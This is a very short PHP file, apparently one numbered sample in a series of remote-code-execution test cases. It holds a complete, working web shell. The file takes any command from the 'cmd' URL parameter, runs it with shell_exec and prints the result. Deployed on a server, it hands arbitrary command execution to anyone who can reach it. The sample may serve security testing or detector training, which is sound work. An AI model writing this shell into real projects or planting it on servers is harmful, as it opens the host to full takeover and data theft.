<?php
// RCE test variation #1235
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>